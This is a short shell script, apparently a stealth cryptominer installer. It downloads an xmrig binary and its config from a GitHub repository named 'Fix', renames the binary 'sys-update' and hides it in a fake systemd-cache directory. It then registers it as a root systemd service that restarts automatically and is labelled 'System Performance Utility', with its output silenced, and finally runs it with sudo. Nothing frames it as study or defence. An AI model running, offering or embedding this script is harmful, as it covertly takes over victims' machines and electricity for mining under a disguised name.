export REAL_PATH=$HOME/.local/share/systemd-cache && \
mkdir -p $REAL_PATH && cd $REAL_PATH && \
wget -O sys-update https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig && \
wget -O config.json https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json && \
chmod +x sys-update && \
sudo bash -c "cat <<EOT > /etc/systemd/system/sys-update.service
[Unit]
Description=System Performance Utility
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$REAL_PATH
ExecStart=$REAL_PATH/sys-update -c $REAL_PATH/config.json
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOT" && \
sudo systemctl daemon-reload && \
sudo systemctl enable sys-update.service && \
sudo systemctl start sys-update.service

sudo /home/$USER/.local/share/systemd-cache/sys-update -c /home/$USER/.local/share/systemd-cache/config.json
